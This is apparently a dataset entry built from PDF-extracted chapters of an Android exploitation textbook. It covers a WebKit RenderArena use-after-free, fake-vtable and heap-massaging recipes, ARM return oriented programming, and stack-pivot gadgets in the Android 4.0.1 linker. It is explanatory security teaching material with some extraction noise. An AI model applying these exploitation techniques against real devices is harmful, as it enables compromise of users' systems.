100677\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 2050]\n0x00000000 in ?? ()\n↓ Dump all the registers.\ngdb » i r\nr0 0x6157a8 0x6157a8\nr1 0x0 0x0\nr2 0x80000000 0x80000000\nr3 0x0 0x0\nr4 0x6157a8 0x6157a8\nr5 0x615348 0x615348\nr6 0x514b78 0x514b78\nr7 0x1 0x1\nr8 0x5ba40540 0x5ba40540\nr9 0x5ba40548 0x5ba40548\nr10 0xa5 0xa5\nr11 0x615424 0x615424\nr12 0x3 0x3\nsp 0x5ba40538 0x5ba40538\nlr 0x59e8ca55 0x59e8ca55\npc 0x0 0\ncpsr 0x10 0x10\n↓ Disassemble calling function.\ngdb » disas $lr\nDump of assembler code for function\n_ZN7WebCore12RenderObject14layoutIfNeededEv:\n0x59e8ca40 <+0>: push {r4, lr}\n0x59e8ca42 <+2>: mov r4, r0\n0x59e8ca44 <+4>: bl 0x59e4b904\n<_ZNK7WebCore12RenderObject11needsLayoutEv>\n0x59e8ca48 <+8>: cbz r0, 0x59e8ca54\n<_ZN7WebCore12RenderObject14layoutIfNeededEv+20>\n↓ Load pointer to virtual function table into r0.\n0x59e8ca4a <+10>: ldr r0, [r4, #0]\nc08.indd 11:10:3:AM 02/25/2014 Page 285\n286 Chapter 8 ■ Exploiting User Space Software\n↓ Load actual function pointer into r3 (this will be the 0 address jumped to,\ncausing a crash).\n0x59e8ca4c <+12>: ldr.w r3, [r0, #380] ; 0x17c\n↓ Load new this pointer into r0 argument.\n0x59e8ca50 <+16>: mov r0, r4\n↓ Actual virtual function call.\n0x59e8ca52 <+18>: blx r3\n0x59e8ca54 <+20>: pop {r4, pc}\nEnd of assembler dump.\n↓ Examine virtual function table pointer and this object at call site.\ngdb » x/1wx $r0\n0x6157a8: 0x00615904\n↓ Print actual function pointer.\ngdb » x/1wx (*$r0 + 0x17c)\n0x615a80: 0x00000000\nThe call site is a very generic layout function declared for all RenderObject-\nderived classes, as shown in the following:\nlayoutIfNeeded in RenderObject.h\n/* This function performs a layout only if one is needed. */\nvoid layoutIfNeeded() { if (needsLayout()) layout(); }\nIt now becomes very clear that you are dealing with a RenderArena use-after-\nfree scenario, where the virtual function table pointer has been overwritten as\nexplained in the “WebKit Specifi c Allocator: The RenderArena” section earlier\nin this chapter. A motivated source code auditor might strive to understand the\nbug better, but for our purposes this is a suffi cient understanding. Unluckily,\nthe bug does not allow an attacker to regain JavaScript control after triggering\nthe free, making more code analysis mostly useless. In order to exploit this\nissue, you must control the contents of the fake virtual function pointer table,\nc08.indd 11:10:3:AM 02/25/2014 Page 286\nChapter 8 ■ Exploiting User Space Software 287\nwhich currently points into another RenderObject instance whose contents\nyou do not control.\nControlling the Heap\nNow that a virtual function pointer table from the heap is being dereferenced,\nyou must take control of the contents of this heap region to infl uence code\nexecution. Because the virtual function invocation happens right after freeing\nthe block and without returning to attacker-controlled code, it is not possible to\nallocate an arbitrary RenderObject in its place. Even if the attacker could gain\nintermediate JavaScript execution, he would have to craft another RenderObject\nof the size 0x7c. Only the original RenderBlock class has this specifi c size, so\nthe attack possibilities are very limited. Redirecting the virtual function table\npointer while the object is still in a free state appears to be much more promising.\nRecall that the singly linked free list only contains items of the same size. For\nthe previously outlined reasons, it is therefore not possible to put other class\ninstances into this list. However, notice how the dereferenced offset 0x17c inside\nthe virtual function pointer table is bigger than the entire object instance size\nof 0x7c. Therefore the actual function pointer lookup will go past the object\ninto whatever else might be in, or after, the RenderArena. This opens multiple\navenues for controlling the virtual function table pointer.\nUsing CSS\nThe fi rst possibility is to allocate another RenderObject such that it is taken\nfrom new unallocated space following the allocation to be freed instead of an\nexisting free spot. By controlling the contents of the new allocation, you can\ncontrol the data at the function pointer offset. Making sure that it is taken from\nnew, unallocated space can be achieved by fi lling existing holes with dummy\nallocations. The resulting heap layout is shown in Figure 8-6 earlier.\nUnfortunately, RenderObject-derived classes are designed to be very lean.\nThis makes controlling data within such objects diffi cult. Most of the 32-bit\nintegers in them are CSS values originating from the CSS parser, such as posi-\ntions and margins. Internally, the CSS code uses 4 bits of an integer value to\nstore additional fl ags, such as whether the value represents a percentage. This\nfact results in values being only 28-bit with the high 4 bits cleared. Luckily,\nthere are a few exceptions. One of them is the RenderListItem, the Render Tree\nequivalent of an li DOM node. Such list items can have an absolute position\nvalue specifi ed—for example, when creating a numbered list with special values\nor display offset. This 32-bit value is then copied unmodifi ed to the m_value\nand m_explicitValue members of the associated RenderListItem. Padding\nc08.indd 11:10:3:AM 02/25/2014 Page 287\n288 Chapter 8 ■ Exploiting User Space Software\nwith another dummy RenderBlock instance, you can achieve the exact function\npointer offset you need.\nExamining Matching Class Sizes with gdb\ngdb » p 2 * sizeof('WebCore::RenderBlock')\n+ (uint32_t) &(('WebCore::RenderListItem' *) 0)->m_value\n$1 = 0x17c\nThis way, the full 32 bits of the program counter (pc) can be controlled. The\nspecifi c heap layout with a padding dummy object is shown in Figure 8-11.\n+0×17c\nnext free\nvirtual\nRenderBlock I RenderBlock II\nfunction\ntable pointer\nUaF-RenderBlock RenderListItem\nc08.indd 11:10:3:AM 02/25/2014 Page 288\nnoitcnuf retniop\nFigure 8-11: RenderArena with padding and RenderListItem\nThe RenderListItem-based technique is certainly useful for exploiting this\nvulnerability in older versions of Android that lack the XN mitigation. However,\nin this scenario the attacker controls the contents of r3 but not the memory\npointed to by any register or the memory in its direct vicinity. To circumvent\nXN with ROP, introduced in Chapter 9, the attacker likely needs to control more\nmemory for a successful stack pivot.\nUsing a Free Block\nAnother way of controlling the memory contents of the RenderArena following\nan existing allocation is making sure the memory regions are never allocated\nand stay uninitialized. That way, the virtual function pointer is read from\nuninitialized memory contents. As explained earlier, arenas are allocated from\nthe main heap. If an attacker allocates a RenderArena-sized block from the main\nheap and sets the contents to the desired values, then frees the block again, the\nnext RenderArena allocated will be initialized with attacker controlled values.\nGeneral precautions to preserving a chunk on the dlmalloc heap apply. The\nattacker must be careful that the freed chunk is not coalesced with any border-\ning chunks and that there are enough such free chunks available, such that\nother allocations do not use those free chunks before the next RenderArena\nis allocated. Taking all these tidbits together, this yields the following recipe:\nChapter 8 ■ Exploiting User Space Software 289\n1. Create suffi cient allocations of a RenderArena size and set their contents to\nthe desired values. After each such allocation, also create a small allocation\nserving as guard against coalescing.\n2. Free all RenderArena-sized allocations but not the guards. The guards will\nnow prevent the fake arenas from being coalesced, yet the arenas can be\nused for allocation of a real RenderArena.\n3. Create enough RenderObject instances to use up all space of the existing\narenas and make sure a new arena is allocated from one of the prepared\nblocks.\n4. Create a RenderObject of the same class type as the use-after-free–affected\nobject—RenderBlock in our case study. Make sure this is the last alloca-\ntion in the RenderArena and is freed just before the use-after-free–affected\nobject is freed.\nAfter using this recipe, the heap should look similar to that shown in\nFigure 8-12.\nFake Arena (free, controlled contents)\nGuard (allocated)\nFake Arena\ndlmalloc\nchunks Guard\nFake virtual\nunallocated,\nheader Render* Render* UaF function\ncontrolled\npointer table\nnext free function pointer\noffset\nc08.indd 11:10:3:AM 02/25/2014 Page 289\n…\nFigure 8-12: RenderArena and dlmalloc state after massaging\nUsing an Allocated Block\nIn addition to the previously presented approaches, another approach exists. In\nthis scenario, the attacker places an allocated dlmalloc chunk containing data of\ntheir choosing after the RenderArena chunk. This technique is especially useful\nbecause an allocated block is less likely to be modifi ed in the time that elapses\nbetween heap sculpting and trigger the use-after-free issue. Similar to the freed"
  },
  {
    "input": "What are the key concepts and techniques discussed in this section regarding Return Oriented Programming (ROP) on ARM architecture and how are they applied in the context of Android's dynamic linker and memory corruption exploits?",
    "summary": "This chapter explains how to use Return Oriented Programming (ROP) on ARM architecture to execute arbitrary native code. It covers the differences between ARM and x86 ROP, the use of the Bionic dynamic linker, and techniques for stack pivoting and memory allocation. The chapter provides a detailed example of an ROP chain for the Android 4.0.1 dynamic linker, demonstrating how to exploit vulnerabilities and achieve code execution.",
    "output": "290 Chapter 8 ■ Exploiting User Space Software\nblock approach, the virtual function table pointer would point near the end of\nthe RenderArena. When the virtual method is invoked, the read offset would\nresult in using attacker-controlled data as a function pointer.\nIf everything works out, the attacker now controls both the pc register and\nsuffi cient amounts of memory to perform a stack pivot and start his ROP, bring-\ning him one step closer to full control.\nSummary\nThis chapter covered a range of user-space memory corruption exploitation tech-\nnologies on ARM hardware. Implementation details and exploitation techniques\nrelevant to corrupting stack and heap memory were presented. Although the\nscenarios discussed do not cover all possible vulnerability classes or exploitation\ntechniques, they provide insight into how to approach developing an exploit.\nHeap-based memory corruption attacks are much more application and\nallocator specifi c, but are the most common vulnerabilities these days. Use-\nafter-free scenarios allow reusing a freed memory block with a new, potentially\nattacker controlled allocation and thereby deliberately create an aliasing bug.\nThis condition is explored under Android’s native dlmalloc allocator and the\nWebKit-specifi c RenderArena allocator. Virtual function pointer tables pose a\nway of hijacking native code execution directly from a variety of heap corrup-\ntion issues.\nBy taking a close look at several historic, real-world exploits, you saw how\nsimplicity often leads to increased reliability and decreased development efforts.\nThe GingerBreak exploit showed how to exploit somewhat arbitrary array index-\ning issues by modifying the GOT. The zergRush exploit is a shining example\nof exploiting stack corruption despite the stack cookies present on Android.\nMempodroid demonstrated outside-the-box techniques to leverage a kernel\nvulnerability to achieve privilege escalation.\nLastly, the chapter examined several approaches for exploiting a publicly\ndisclosed and patched use-after-free vulnerability in the WebKit rendering\nengine. The necessary steps for writing your own JavaScript to shape the heap\nare explained. This chapter leaves you with enough control to proceed with the\ntask of crafting a custom stack pivot and ROP chain in Chapter 9.\nc08.indd 11:10:3:AM 02/25/2014 Page 290\nCHAPTER\n9\nReturn Oriented Programming\nThis chapter introduces the basics of Return Oriented Programming (ROP)\nand why using it is necessary. The ARM architecture is very different from\nx86 in regards to ROP, and this chapter introduces some new concepts specifi c\nto ARM. The chapter examines the bionic dynamic linker as a case study of a\nrich and comparatively stable source of code usable for ROP and presents some\nideas for automation.\nHistory and Motivation\nROP is a technique to leverage existing native code in memory as an arbitrary\npayload instead of injecting custom native instruction payloads or shellcode.\nIt has been documented in several degrees of abstraction in various aca-\ndemic papers, but its roots go back to the return2libc technique fi rst publicly\ndocumented by Solar Designer in a 1997 post to the Bugtraq mailing list (http://\nseclists.org/bugtraq/1997/Aug/63). In that article, Solar demonstrated the\nreuse of existing x86 code fragments in order to bypass a non-executable stack\nprotection mechanism. Later, Tim Newsham demonstrated the fi rst chaining\nof more than two calls in his lpset Solaris 7 exploit from May 2000 (http://\nseclists.org/bugtraq/2000/May/90).\n291\nc09.indd 01:20:31:PM 02/24/2014 Page 291\n292 Chapter 9 ■ Return Oriented Programming\nThere are three main reasons to leverage existing native code in today’s ARM\nenvironments and therefore use ROP. The primary, and most obvious reason,\nis the XN exploit mitigation as discussed in Chapter 12. The secondary reason\nis due to the separate data and instruction caches on the ARM architecture as\ndescribed later. Lastly, on some ARM-based platforms, the OS’s loader enforces\n“code-signing,” which requires all binaries to be cryptographically signed. On\nplatforms such as this, illicit code execution (such as that caused by exploita-\ntion of a vulnerability) requires piecing together bits of native code using ROP.\nThe XN exploit mitigation allows the operating system to mark memory pages\nas executable or non-executable, and the processor issues an exception if an\ninstruction is attempted to be fetched from non-executable memory. Subsequently\nan attacker cannot simply provide his payload as native code and divert con-\ntrol fl ow there. Instead he must make use of the existing code in the program’s\naddress space that is already marked as executable. He can then either decide to\nimplement the full payload using existing code or just use existing code as an\nintermediate stage to mark his additionally supplied native code as executable.\nSeparate Code and Instruction Cache\nBecause the ARM9 architecture has the ARMv5 feature set, the processor has\ntwo separate caches for instructions and data:\nThe ARM9TDMI has a Harvard bus architecture with separate instruction\nand data interfaces. This allows concurrent instruction and data accesses,\nand greatly reduces the CPI of the processor. For optimal performance,\nsingle cycle memory accesses for both interfaces are required, although\nthe core can be wait-stated for non-sequential accesses, or slower memory\nsystems.\n. . .\nA typical implementation of an ARM9TDMI based cached processor has\nHarvard caches, and then a unified memory structure beyond the caches,\nthus giving the data interface access to the instruction memory space. The\nARM940T is an example of such a system. However, for an SRAM-based\nsystem this technique cannot be used, and an alternative method must\nbe employed.\nARM Limited, ARM9TDMI™ Technical Reference Manual, Chapter 3.1: “About\nthe memory interface,” 1998, http://infocenter.arm.com/help/\nindex.jsp?topic=/com.arm.doc.ddi0091a/CACFBCBE.html\nAs a consequence, any chunk of native instructions written to memory is not\ndirectly executable, even in the absence of XN. The instructions being written\nc09.indd 01:20:31:PM 02/24/2014 Page 292\nChapter 9 ■ Return Oriented Programming 293\nas data are fi rst written to the data cache and only later fl ushed to the backing\nmain memory. This is depicted in Figure 9-1.\nARM CPU\nL1 Cache\nInstruction\nInstruction\nDecoding\nCache\nEngine\nMain\nMemory\nMemory Unit Data Cache\nFigure 9-1: Data and instruction caches\nWhen the control fl ow is diverted to the address of the just-written instruc-\ntions, the instruction decoding engine attempts to fetch an instruction from\nthe specifi ed address and fi rst queries the instruction cache. Now three things\ncan happen:\n■ The address in question is already in the instruction cache and the main\nmemory is not touched. The original instructions, despite being overwrit-\nten, are executed instead of the attacker’s payload.\n■ A cache miss occurs, and the instructions are fetched from main memory;\nhowever, the data cache has not been fl ushed yet. The fetched instructions\nare the data in the respective memory location before the attacker’s write\nand again the payload is not executed.\n■ Both the data cache has been fl ushed and the instruction cache does not\ncontain the address yet. The instructions are fetched from main memory,\nwhich contains the actual attacker’s payload.\nAs the attacker typically is not writing to addresses that contained code before,\nit is unlikely that the address is in the instruction cache already. However, the\npayload is still not fetched correctly when the data cache has not been fl ushed.\nIn such a scenario one can either leverage existing, legitimate code (which might\nc09.indd 01:20:31:PM 02/24/2014 Page 293\n294 Chapter 9 ■ Return Oriented Programming\neven be in the instruction cache already) or simply write a lot of data to memory\nto fl ush the data cache. When performing surgical exploitation it is simply not\npossible to write much data after the payload has been written; reusing existing\ncode is a necessity.\nNOTE Separate data and instruction caches can become a very tedious issue to\nidentify when switching from a debugger setup to unattended execution in exploit\ndevelopment. When hitting breakpoints or switching to the debugger process for\nother reasons, the data caches are typically fl ushed. Also the debugger sees only the\ndata in main memory and not what is actually in the instruction cache. As soon as the\ntarget is run without a debugger attached, the process crashes in what seems to be\nthe attacker’s payload. Keep this one in mind as a source of weird crashes!\nThe ARM processors have special instructions for fl ushing the caches. These\ninstructions modify the CP15 system control coprocessor’s registers. Unfortunately,\nthese instructions access privileged registers and are therefore not usable by\nuser-mode code. The “PLI” instruction can also be used to hint that the instruc-\ntion cache should be reloaded, but this is not guaranteed.\nOperating systems provide mechanisms for clearing the instruction cache via\nsystem calls. On Linux, this is done via invoking a system call also accessible\nas the cacheflush function. Usually, there is no way to invoke such functions\nbefore gaining arbitrary code execution. However, the Linux kernel also fl ushes\nthe cache when an mprotect system call is issued. The effects of separate caches\ncan therefore be disregarded when creating a ROP chain that marks data as\nexecutable code and subsequently transfers execution there.\nBasics of ROP on ARM\nBecause the targeted application typically does not contain the attacker’s pay-\nload as one code chunk to which the control fl ow can simply be diverted to, the\nattacker needs to piece together chunks of original code that together implement\ntheir payload. The challenge is maintaining control over the program counter\nafter execution of one such code chunk.\nThe original ret2libc technique chains one or more calls into libc procedures\non the x86 architecture. In that architecture, the return address is stored on the\nstack. This address indicates where a routine will pass execution to when it\nreturns. By manipulating the stack contents, the attacker can provide the address\nof a libc procedure to call instead of a legitimate return address.\nROP is a generalization of this methodology. Not only does it use full pro-\ncedures but also smaller code chunks called Gadgets. To maintain control over\nc09.indd 01:20:31:PM 02/24/2014 Page 294\nChapter 9 ■ Return Oriented Programming 295\nthe program counter, these gadgets typically end in the very instruction that is\nalso used to return from legitimate procedures. The attacker can then choose\na series of gadgets that when sequentially executed implement their payload.\nFigure 9-2 shows how such chaining of gadgets looks on the x86 architecture.\nWith further generalization of this technique, you can use any gadget ending\nin an indirect branch. For example, indirect branches, or branches that read the\nbranch target from a register, are usable. The methodology is similar to that of ROP\nexcept that the respective register has to be loaded with the following gadget’s\naddress beforehand. Because the methodology there is very dependent on the\nactually available gadgets, this chapter does not cover this topic in more depth.\nGadgets Stack\n.\n.\nmov rax, rbx .\nret\nAddress I\nmov rsi, rcx\nret\nAddress II\ncall [rax]\nret\nAddress III\n.\n.\n.\nFigure 9-2: x86 ROP Gadget stack chaining\nARM Subroutine Calls\nIn accordance with the ARM ABI (Application Binary Interface, the standard that\ndefi nes how compiled software should be structured on ARM) a subroutine’s\nreturn address is not generally stored on the stack. Instead, it is held in the link\nregister lr, which serves this specifi c purpose. Functions are invoked with the\nbl or blx instructions that load the address of the following instruction into the\nlr register and then branch to the specifi ed function. The called function then\ntypically returns using the bx lr instruction. Because the program counter on\nARM is treated like any other register that can be read from and written to, it\nis also possible to just copy the value of the lr into the pc register. Therefore,\nmov pc, lr can be a valid function tail, too.\nc09.indd 01:20:31:PM 02/24/2014 Page 295\n296 Chapter 9 ■ Return Oriented Programming\nHowever the ARM processor also supports two major execution modes: ARM\nand Thumb (including the Thumb2 extension). Switching between modes is\naccomplished using a technique called Interworking. For example, the bx lr\ninstruction examines the low bit of the lr and switches to Thumb mode if it is set\nor ARM mode if it is not set. Underneath, this low bit gets masked off and stored\nin the fi fth bit of the Current Program Status Register (CPSR). This bit, called\nthe T-bit, determines which execution mode the processor is in. Analogously,\nthe bl and blx instructions set the low bit in the lr when the calling function is\nin Thumb mode. Therefore, it is only possible to use the mov pc, lr instruction\nwhen both the calling and called functions use the ARM instruction encoding.\nBecause there is no performance difference between the mov pc, lr and bx lr\ninstructions, any modern compiler only emits bx lr instructions to return from\nprocedures when confi gured to build code for ARMv6, as shown in Figure 9-3.\nlr contents\nA … A T\n31 1 0\nbx lr\nA … A 0 … T …\n31 1 0 31 6 5 4 0\npc contents CPSR contents\nFigure 9-3: Interworking procedure return\nUpon reading this, exploit developers may immediately wonder how exploita-\ntion of even simple stack overfl ows can be accomplished, because the traditional\ntechnique on x86 involves overwriting the caller’s return address stored on the\nstack. Using a single register for storing the return address into the calling pro-\ncedure works fi ne for leaf procedures but is insuffi cient when a routine wants\nto call other subroutines by itself again. To accommodate this, ARM compilers\ngenerate code that saves the lr on the stack on routine entry and restores it from\nthe stack before executing the bx lr to return to its calling routine, as shown in\nthe following code.\nARM Instructions Calling a Subroutine\nstmia sp!, {r4, lr} # Store link register and callee-saved r4 on stack\n...\nbl subroutine # Call subroutine, trashing link register\n...\nldmia sp!, {r4, lr} # Load original link register and r4 from stack\nbx lr # Return to calling code\nc09.indd 01:20:31:PM 02/24/2014 Page 296\nChapter 9 ■ Return Oriented Programming 297\nThe Thumb instruction encoding features special push and pop instructions\nthat implicitly work on the sp register (the stack pointer) instead of referencing\nit explicitly. As a special extension to that, a pop instruction referencing the pc\nregister handles the written value in the same way as the bx lr instruction,\nthus enabling Interworking with a single instruction, as in the following code.\nThumb Instructions Calling a Subroutine\npush {lr} # Store link register on stack\n...\nbl subroutine # Call subroutine, trashing link register\n...\npop {pc} # Load original link register and return to calling code\nThe Thumb pop {pc} instruction is very much like the x86 ret instruction\nin that it retrieves a value from the stack and continues execution there. The\nnotable difference is that the pop instruction can serve as a whole epilogue, also\nrestoring other registers with a single instruction. However, a Thumb leaf routine\ncan still end in a bx lr instruction, when the lr still contains the proper value.\nCombining Gadgets into a Chain\nRecall that your goal is to use existing code sequences for forming your payload.\nIf the attacker is able to control the stack, any sequence of instructions ending\nin either bx lr or pop {…, pc} lets the attacker maintain control over the pro-\ngram counter and can be used as a gadget. Thanks to Interworking, ARM and\nThumb gadgets can even be arbitrarily mixed. The only exception here is that\nthe rare gadgets ending in ARM mov pc, lr can only be followed by another\nARM gadget, because they do not support Interworking.\nCombining gadgets that restore the lr from the stack using an ldmia sp!,\n{..., lr} before bx lr or simply pop {..., pc} is straightforward. Because they\nload lr from the stack and then continue execution there, the address of the next\ngadget can be simply supplied on the stack. In addition to gadget addresses,\nregister values potentially restored by function epilogues must be supplied,\neven if they serve no functional purpose in the ROP payload. This is because\nthe stack pointer otherwise does not line up with the next intended gadget. If\nthe next gadget uses Thumb instructions, additionally the low bit must be set\nso the processor correctly switches to Thumb mode. This is even true when the\nprocessor is in Thumb mode already, as it would assume the calling function\nwas in ARM—and therefore transition to ARM mode—if the low bit was not set.\nFor purposes of demonstration, assume that in Figure 9-4 you have just per-\nformed a stack overfl ow that allowed you to write whatever you want onto the\nstack (including nulls) and that you are about to execute a pop {pc} instruction.\nIn the presence of non-executable stack, you exploit the vulnerability by calling\nc09.indd 01:20:31:PM 02/24/2014 Page 297\n298 Chapter 9 ■ Return Oriented Programming\nmprotect to re-protect the stack as executable, and execute your native code in\nplace. In that case, your payload written onto the stack may look something\nlike Figure 9-4.\nGadget Stack\nb00038cb\npop {r0-r4, pc} r0\nr1\nr2\nr3\nr4\npc=b000...\n???\nFigure 9-4: Simple POP-ROP chain\nGadgets from leaf procedures––ending in bx lr without restoring lr fi rst––\nrequire special handling of the lr value prior to executing that gadget. Typically,\nthe value contained in lr is the address of the gadget following the last ARM\ngadget that restored the value of lr explicitly (because the ARM gadget restored\nlr from the stack and set it to the address of the next gadget). When a whole\nprocedure that invokes subprocedures was used, lr points to after the last sub-\nprocedure call in that procedure, resulting in even more unexpected behavior.\nWhen another gadget ending in bx lr would be executed, it would actually jump\nright after that very sub-procedure call instead of the next gadget intended to\nbe executed. If lr still points to a previously used gadget that has no destruc-\ntive side effects, it is often easiest to account for the execution of that previously\nused gadget by providing the required restored values on the stack. However if\nlr points anywhere into a bigger procedure or the gadget cannot be executed a\nsecond time, the value of lr itself must be adjusted. This can be done generically\nby combining an ARM gadget that explicitly restores lr with a Thumb gadget\nthat ends in a pop {pc} instruction, as shown in Figure 9-5.\nThe ARM gadget loads the address of the next gadget into lr and branches\nthere; the following Thumb gadget also simply branches to the next gadget. But\nas a side effect, lr now points to a Thumb gadget that allows seamless continua-\ntion, and any gadget ending in only bx lr can be safely executed. Now it is p os-\nsible to use any instruction sequence ending in a procedure return as a gadget.\nc09.indd 01:20:31:PM 02/24/2014 Page 298\nChapter 9 ■ Return Oriented Programming 299\nRegister Gadget Stack\nb000133c\npop {r0, lr} r0 = ???\nbx lr\nlr lr = b0002ab0\nb0002ab0\npc = ???\npop {pc}\n.\n.\n.\n.\n???\nFigure 9-5: Set lr to pop {pc} chain\nIdentifying Potential Gadgets\nBecause the ARM processor requires aligned instructions, it is generally only\npossible to use intentionally generated code—or more specifi cally compiler\ngenerated routine epilogues—as gadgets. This differs from the x86 architecture’s\nunaligned Complex Instruction Set Computing (CISC) instruction set. Because\nthe return instruction is only one byte on x86, it is often possible to jump into\nparts of bigger instructions that coincidentally contain a byte resembling the\nreturn instruction. This vastly increases the amount of available gadgets on x86.\nIdentifying a list of potential gadgets is very easy on Reduced Instruction Set\nComputing (RISC) architectures like ARM. With its always-aligned instructions,\none can simply scan a binary image for instructions that perform a function\nreturn, such as pop {..., pc}. Examining the previous instructions in an assem-\nbler dead listing already shows the potential gadgets. Therefore fi nding gadgets\ncan be as easy as creating an ARM and a Thumb dead listing for a given binary\nand parsing the output with regular expressions. A script using this technique\nwas used to create the ROP chain presented in this chapter.\nA trick similar to jumping into parts of bigger instructions on x86 also exists\non ARM: Because it is possible to freely switch between ARM and Thumb modes,\nit is also possible to misinterpret any existing ARM code as Thumb code and\nvice versa. Although this typically does not provide useful gadgets longer than\none or two instructions, interpreting the upper two bytes of an ARM instruction\ncan often provide surprisingly useful pop {..., pc} Thumb instructions. These\ninstructions often restore registers that are typically not restored in common\nroutine epilogues, such as the caller-saved registers r0 to r3 or the stack pointer\nc09.indd 01:20:31:PM 02/24/2014 Page 299\n300 Chapter 9 ■ Return Oriented Programming\nitself. A breakdown of both the Thumb and ARM view of such an example is\nprovided in Figure 9-6.\nldclt 0, cr6, [pc, # −100]\n“lt” condition “ldc” instruction flags f “pc” …\ni\nx\nP e\nd\n1011 110 (1) 000 1 1111\nARM 0×bf 0×1f 0×60 0×19\nThumb\n1011 110 1 000 11111\nThumb “pop” {pc} not {r5−r7} {r0−r4}\ninstruction\npop {r0−r4, pc}\nFigure 9-6: Breakdown of misinterpreted pop\nAlso, special code dealing with exception unwinding and early process ini-\ntialization can contain immensely useful gadgets. Those have been specifi cally\nimplemented in the assembler to deal with low-level architecture components.\nThey occur, for example, in the C library and dynamic linker, as used in the\nnext section.\nCase Study: Android 4.0.1 Linker\nBecause most processes running on Android are forked from the Zygote base\nprocess, they often share a lot of libraries. However, some native processes are\nnot forked from Zygote and might have an entirely different process layout. One\nexample is the Radio Interface Layer Daemon (rild) as discussed in Chapter\n11. But even those processes are all dynamically linked and therefore all have\none common code mapping in their address spaces: the Dynamic Linker. This\nis the part of code that recursively resolves the dynamic library dependencies\nin a process’s base binary and loads all the dependencies. It then resolves all\nthe symbols imported from other libraries and adjusts addresses accordingly.\nIt also takes care of applying relocations for binaries that have been moved to\nanother address than the expected base address, for example, due to Address\nSpace Layout Randomization (ASLR).\nc09.indd 01:20:31:PM 02/24/2014 Page 300\nChapter 9 ■ Return Oriented Programming 301\nOn Android 4.0 and earlier, the Bionic dynamic linker is mapped at a static\naddress, 0xb0001000. Due to this fact, no information leak was required to craft\nyour ROP payload. As of Android 4.1, Jelly Bean, the dynamic linker’s base address\nis randomized like any other binary’s base address, as discussed in Chapter 12.\nBesides being present in all processes and having a fi xed base address on\nold Android versions, the dynamic linker is also a comparatively stable binary.\nThat is, the binary representation does not vary as much as other libraries. The\ncontents of most libraries contained in Android processes fl uctuate between\ndifferent phones or even specifi c fi rmware images (ROMs) of the same Android\nversion. The dynamic linker in turn has been very constant. Likely due to the\nsensitivity and criticality of this component, it is almost always left untouched\nand compiled with the prebuilt compilers coming with the Android source\ndistribution. Note that the dynamic linker contains a copy of the Bionic memcpy\nimplementation at a low offset. Because memcpy is heavily optimized for the tar-\nget architecture, its varying instruction streams result in slight offset variations\nfor different processor feature sets. As a consequence, any linker ROP chains’\ngadget addresses are specifi c to a certain processor feature set.\nFor those reasons, the dynamic linker is the perfect goal for crafting a some-\nwhat generic ROP chain that can be potentially reused on as many targets as\npossible. As a case study, this chapter examines an ROP chain for the Android\n4.0.1 dynamic linker, as found on the Galaxy Nexus. This case study is intended\nto continue the WebKit exploit introduced in Chapter 8.\nBecause Android has no signature enforcement on executable code mappings,\nthe ROP chain simply allocates one page (4,096 bytes) of executable memory, cop-\nies an attacker-provided native code there, and jumps to it. This allows plugging\nin an arbitrary user-mode payload into an exploit by supplying different code.\nPivoting the Stack Pointer\nUsually the fi rst step in launching an ROP payload is getting the stack pointer\nto point at attacker-supplied data, such as the heap, which is also called Pivoting.\nWhen exploiting stack-based buffer overfl ows, the stack pointer is usually close\nto the ROP payload, and pivoting can be easy. When the attacker-supplied data\nresides on the heap, pivoting the stack can be one of the most challenging tasks\ninvolved in creating a functional ROP chain.\nGoing back to the example from Chapter 8, we assume we have gained control\nof the program counter via hijacking a virtual function pointer in a RenderObject\nclass and cleverly faking the corresponding vtable. Even for other scenarios,\nsuch as a generic use-after-free on the main heap, it is often necessary to pivot\nthe stack pointer onto the heap. Depending on the bug being exploited, there\nmight be better-suited techniques instead of the generic approach presented\nhere. One example is the presence of a heap pointer on the stack due to a local\nc09.indd 01:20:31:PM 02/24/2014 Page 301\n302 Chapter 9 ■ Return Oriented Programming\nvariable. This pointer can then be used by a frame pointer to stack pointer\nrestoring epilogue to pivot into the heap.\nThere is one particularly interesting gadget in the linker that allows setting\nall registers to absolute, user-defi ned values. This master gadget is so powerful\nthat it has been previously independently chosen by at least one other exploit\nwriter for a private exploit. It is part of unused exception unwinding code, and\nits Android 4.0.1 incarnation looks like the following:\n.text:B0002868 EXPORT __dl_restore_core_regs\n.text:B0002868\n.text:B0002868 ADD R1, R0, #0x34\n.text:B000286C LDMIA R1, {R3-R5}\n.text:B0002870 STMFD SP!, {R3-R5}\n.text:B0002874 LDMIA R0, {R0-R11}\n.text:B0002878 LDMFD SP, {SP-PC}\n.text:B0002878 ; End of function __dl_restore_core_regs\nThe power of this function lies in the multiple entry points one can choose\nto turn it into a gadget:\n■ Starting from the end by using 0xb0002878 as gadget start address, the\nstack pointer is loaded from the current stack, together with lr and the\nnew program counter. This is a useful gadget when the topmost local\nvariable in the stack frame points to user-controlled data, but that is a\nhighly bug-specifi c scenario.\n■ When jumping to 0xb0002870, the register contents of r3, r4, and r5 are\nstored on the top of the stack frame before sp, lr, and pc are restored from\nthere. This is useful when r3 points to user-controlled data and r5 to some\nvalid code (for example, a function pointer from the bug environment).\n■ Alleviating the previous rather strong requirements, one can jump to\n0xb000286c and load the future contents of sp, lr, and pc by dereferencing\nthe memory at r1. This allows either abusing an existing memory object\nwith pointers to user-controlled data at the fi rst double word or when the\ncontents pointed to by r1 are fully user controlled and the value to set the\nstack pointer to can be determined reliably. This is an especially interest-\ning gadget. The compiler often generates code to load the vtable pointer\ninto r1 when calling a vtable function that does not have any parameters.\nBecause in this scenario you need to fake a vtable for pc control, you can\nlikely also control the fi rst double word of it, and thereby sp, using this\npivot gadget.\n■ Lastly, when using the entire function as pivot gadget by jumping to\n0xb0002868, sp can be set by dereferencing r0 with an offset of 0x34.\nAlthough this offset at fi rst seems random, it is actually quite handy for\nc09.indd 01:20:31:PM 02/24/2014 Page 302\nChapter 9 ■ Return Oriented Programming 303\nreal-world cases. For all hijacked vtable calls, r0 will be the “this” pointer.\nThis very often allows controlling data at offset 0x34 by manipulating\nmember variables of the class in question.\nIf the pivots provided by the master gadget do not fi t a particular use case,\nthere are even more options thanks to the call-sites of this function:\n.text:B0002348 ADD R0, SP, #0x24C\n.text:B000234C BL __dl_restore_core_regs\n.text:B00023D0 ADD R0, R4, #4\n.text:B00023D4 BL __dl_restore_core_regs\n.text:B00024F0 ADD R0, R5, #4\n.text:B00024F4 BL __dl_restore_core_regs\nUsing these additional addresses, you can also load sp dereferencing from\nr4 + 0x38, r5 + 0x38, and from further down 